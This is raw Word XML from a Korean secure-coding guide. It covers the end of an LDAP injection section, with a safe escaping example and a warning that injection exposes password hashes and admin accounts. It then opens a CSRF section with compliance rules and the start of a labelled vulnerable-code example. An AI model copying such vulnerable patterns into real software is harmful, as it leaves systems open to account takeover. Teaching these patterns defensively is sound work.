                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>모든</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>항목이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>조회됩니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>전체</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>계정</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>목록</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>·</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>비밀번호</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>해시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>·</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>조직</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>구조가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>노출되며</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>관리자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>권한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>계정</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>탈취로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>이어질</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>있습니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] LDAP </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>특수문자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>이스케이프</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>처리</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>String safeUser = username.replaceAll("[\\*()=+&lt;&gt;#;]", "");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>String filter = "(uid=" + safeUser + ")";</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">// </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>또는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> OWASP ESAPI</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>의</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> Encoder.encodeForLDAP() </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>활용</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">  11. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>크로스사이트</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>요청</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>위조</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>(CSRF)</w:t>
      </w:r>
      <w:r w:rsidR="00B044C0">
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r w:rsidR="00B044C0">
        <w:rPr>
          <w:rFonts w:ascii="바탕체" w:eastAsia="바탕체" w:hAnsi="바탕체" w:cs="바탕체" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>인증 토큰</w:t>
      </w:r>
      <w:r w:rsidR="00B044C0">
        <w:rPr>
          <w:rFonts w:ascii="바탕체" w:eastAsia="바탕체" w:hAnsi="바탕체" w:cs="바탕체"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B044C0">
        <w:rPr>
          <w:rFonts w:ascii="바탕체" w:eastAsia="바탕체" w:hAnsi="바탕체" w:cs="바탕체" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>없이 값을 전달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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>폼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전송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시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서버에서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발급한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> CSRF </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>토큰을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포함하고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서버에서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검증한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>중요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기능</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>이체</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>비밀번호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변경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등</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>에는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세션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검증과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함께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재인증을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적용한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>입력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폼은</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> GET </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>방식보다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> POST </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>방식을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사용한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>&lt;!-- [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>토큰</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>없이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>중요</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>기능</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>처리</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> --&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">&lt;!-- </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공격자가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
